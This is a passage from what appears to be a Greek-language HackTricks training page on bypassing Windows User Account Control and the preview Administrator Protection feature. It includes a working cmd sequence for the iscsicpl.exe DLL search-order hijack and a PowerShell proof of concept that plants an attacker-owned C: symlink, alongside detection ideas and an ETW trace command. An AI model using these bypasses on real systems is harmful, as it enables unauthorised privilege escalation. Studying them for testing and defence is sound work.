Αν έχετε πρόσβαση σε **GUI**, μπορείτε απλώς να αποδεχτείτε το prompt του UAC όταν εμφανιστεί· στην πραγματικότητα δεν χρειάζεστε τεχνικό bypass. Επομένως, η απόκτηση μιας GUI session συχνά αρκεί για να παρακάμψετε την πρακτική τριβή που προσθέτει το UAC.

Επιπλέον, αν αποκτήσετε μια GUI session που χρησιμοποιούσε κάποιος (ενδεχομένως μέσω RDP), θα υπάρχουν **ορισμένα εργαλεία που θα εκτελούνται ως administrator**, από τα οποία θα μπορούσατε να **εκτελέσετε** για παράδειγμα ένα **cmd** **ως admin** απευθείας, χωρίς να σας ζητηθεί ξανά επιβεβαίωση από το UAC, όπως το [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Θορυβώδες brute-force UAC bypass

Αν ο θόρυβος είναι αποδεκτός, ένα εργαλείο όπως το [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) μπορεί να ζητά επανειλημμένα elevation μέχρι ο χρήστης να το αποδεχτεί.

### Το δικό σας bypass - Βασική μεθοδολογία UAC bypass

Αν εξετάσετε το **UACME**, θα παρατηρήσετε ότι **πολλά UAC bypasses κάνουν abuse σε DLL hijacking** (συχνά αναγκάζοντας ένα elevated binary να φορτώσει ένα DLL που ελέγχεται από τον attacker από ένα writable path). [Διαβάστε αυτό για να μάθετε πώς να εντοπίζετε μια ευπάθεια DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Εντοπίστε ένα binary που κάνει **autoelevate** (ελέγξτε ότι όταν εκτελείται, εκτελείται σε επίπεδο high integrity).
2. Με το procmon, εντοπίστε συμβάντα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψετε** το DLL μέσα σε ορισμένα **protected paths** (όπως το C:\Windows\System32), στα οποία δεν έχετε δικαιώματα εγγραφής. Μπορείτε να το παρακάμψετε χρησιμοποιώντας:
1. **wusa.exe**: Windows 7, 8 και 8.1. Επιτρέπει την εξαγωγή των περιεχομένων ενός αρχείου CAB μέσα σε protected paths (επειδή το εργαλείο εκτελείται από επίπεδο high integrity).
2. **IFileOperation**: Windows 10.
4. Προετοιμάστε ένα **script** για να αντιγράψετε το DLL μέσα στο protected path και να εκτελέσετε το ευάλωτο και autoelevated binary.

### Μια άλλη τεχνική UAC bypass

Συνίσταται στην παρακολούθηση του αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/διαδρομή** ενός **binary** ή μιας **εντολής** που πρόκειται να **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + DLL hijack του user `PATH`

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα **auto-elevated** binary που μπορεί να γίνει abuse για να φορτώσει το `iscsiexe.dll` μέσω της σειράς αναζήτησης. Αν μπορείτε να τοποθετήσετε ένα κακόβουλο `iscsiexe.dll` μέσα σε έναν **user-writable** φάκελο και, στη συνέχεια, να τροποποιήσετε το `PATH` του τρέχοντος user (για παράδειγμα μέσω του `HKCU\Environment\Path`), ώστε να γίνεται αναζήτηση σε αυτόν τον φάκελο, τα Windows ενδέχεται να φορτώσουν το attacker DLL μέσα στη διεργασία του elevated `iscsicpl.exe` **χωρίς να εμφανίσουν UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Πρακτικές σημειώσεις:
- Αυτό είναι χρήσιμο όταν ο τρέχων user ανήκει στους **Administrators**, αλλά εκτελείται σε **Medium Integrity** λόγω του UAC.
- Το αντίγραφο του **SysWOW64** είναι το σχετικό για αυτό το bypass. Αντιμετωπίστε το αντίγραφο του **System32** ως ξεχωριστό binary και επικυρώστε τη συμπεριφορά του ανεξάρτητα.
- Το primitive είναι συνδυασμός **auto-elevation** και **DLL search-order hijacking**, επομένως η ίδια ροή εργασίας του ProcMon που χρησιμοποιείται για άλλα UAC bypasses είναι χρήσιμη για την επικύρωση της φόρτωσης του DLL που λείπει.

Ελάχιστη ροή:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ιδέες ανίχνευσης:
- Ειδοποίηση για `reg add` / εγγραφές στο registry στο `HKCU\Environment\Path` που ακολουθούνται άμεσα από εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
- Αναζήτηση του `iscsiexe.dll` σε τοποθεσίες που **ελέγχονται από τον χρήστη**, όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Συσχέτιση εκκινήσεων του `iscsicpl.exe` με μη αναμενόμενες child processes ή φορτώσεις DLL από τοποθεσίες εκτός των κανονικών καταλόγων των Windows.

### Νεότερη έρευνα που αξίζει να ελεγχθεί ξεχωριστά

Ορισμένες αλυσίδες μετά το 2024 δεν μοιάζουν πλέον με τα κλασικά `HKCU\Software\Classes` registry hijacks. Για παράδειγμα, το activation-context cache poisoning μπορεί να συνδυάσει ένα **drive remap** και **DLL redirection** για μετάβαση από medium σε high integrity μέσω trusted UI / auto-elevated binaries, όπως το `ctfmon.exe`, και αργότερα targets όπως το `fodhelper.exe`. Αντί να αντιγράψετε εδώ το μεγάλο PoC, ελέγξτε τα συμπαγή παραδείγματα payload στα:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) drive-letter hijack μέσω per-logon-session DOS device map

> [!NOTE]
> Από τον Αύγουστο του 2026, η Microsoft εξακολουθεί να τεκμηριώνει το Administrator Protection ως **Insider preview**: η διάθεση του Οκτωβρίου 2025 ανακλήθηκε και έχει προγραμματιστεί για μεταγενέστερη ημερομηνία. Επιβεβαιώστε ότι το **Admin Approval Mode with Administrator protection** είναι πράγματι ενεργοποιημένο και ότι η συσκευή έχει γίνει reboot πριν δοκιμάσετε αυτές τις αλυσίδες· μια τυπική συμβολοσειρά έκδοσης 25H2 από μόνη της δεν αποδεικνύει ότι η λειτουργία είναι ενεργή.<sup>[[10]](#references)</sup>

Για την πλήρη επιφάνεια επίθεσης `RAiLaunchAdminProcess` / UIAccess σε preview builds των Windows 11 25H2, ελέγξτε την αποκλειστική σελίδα:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Το “Administrator Protection” των Windows 11 25H2 χρησιμοποιεί shadow-admin tokens με per-session `\Sessions\0\DosDevices/<LUID>` maps. Ο κατάλογος δημιουργείται lazy από το `SeGetTokenDeviceMap` κατά την πρώτη επίλυση του `\??`. Αν ο attacker κάνει impersonate το shadow-admin token μόνο σε **SecurityIdentification**, ο κατάλογος δημιουργείται με τον attacker ως **owner** (κληρονομεί το `CREATOR OWNER`), επιτρέποντας drive-letter links που έχουν προτεραιότητα έναντι του `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Βήματα:**

1. Από μια low-privileged session, καλέστε το `RAiProcessRunOnce` για να δημιουργήσετε ένα promptless shadow-admin `runonce.exe`.
2. Κάντε duplicate το primary token του σε token **identification** και κάντε impersonate σε αυτό ενώ ανοίγετε το `\??`, ώστε να εξαναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` υπό ownership του attacker.
3. Δημιουργήστε ένα `C:` symlink εκεί που δείχνει σε storage ελεγχόμενο από τον attacker· οι επόμενες filesystem accesses σε εκείνη τη session θα επιλύουν το `C:` προς το path του attacker, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Σε hosts προεπισκόπησης, το Administrator Protection καταγράφει εγκρίσεις και αποτυχίες ως ETW events **15031** και **15032** στον provider `Microsoft-Windows-LUA`. Τα events περιλαμβάνουν το SID του αιτούντος, τη διαδρομή της εφαρμογής, το αποτέλεσμα, τον managed administrator account και τη μέθοδο authentication, επομένως οι επαναλαμβανόμενες exploit attempts ή οι αποτυχημένες προσπάθειες χειρισμού του UI δεν είναι χωρίς telemetry.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Πώς λειτουργεί το User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Συλλογή τεχνικών παράκαμψης του UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Σαρωτής συμβατότητας και launcher για παράκαμψη του UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – Το KONNI υιοθετεί AI για τη δημιουργία PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Εκμετάλλευση 0-Day εναντίον κυβερνητικών στόχων στη Νοτιοανατολική Ασία](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Παράκαμψη της προστασίας διαχειριστή των Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Παράκαμψη του UAC με χρήση της εργασίας SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Παρακάμψεις των UnifiedConsent, TabTip και Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Προστασία διαχειριστή](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Κλήση τοπικών Windows RPC Servers από .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – Το HoneyMyte ενισχύει το CoolClient με ένα υπογεγραμμένο Windows Kernel Rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
